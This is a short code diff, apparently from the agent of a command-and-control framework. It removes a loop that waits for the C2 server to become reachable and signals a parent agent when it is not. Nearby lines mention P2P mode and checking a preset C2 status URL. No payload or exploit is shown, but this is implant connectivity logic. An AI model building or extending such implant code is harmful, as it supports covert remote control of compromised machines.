@@ -182,16 +182,6 @@ func agent_main() {
 		}
 	}
 
-	// ────────────────────────────────────────────────────────────────────────────
-	// Standalone + Gateway: wait for direct C2 reachability
-	// ────────────────────────────────────────────────────────────────────────────
-	if !common.RuntimeConfig.IsP2PEnabled || common.RuntimeConfig.IsDirectC2Enabled {
-		for !isC2Reachable() {
-			logging.Infof("[-] C2 unreachable, signaling parent and retrying...")
-			conditionalC2FailNotify()
-		}
-	}
-
 	isCheckedIn := false
 connect:
 	// check preset CC status URL, if CC is supposed to be offline, take a nap
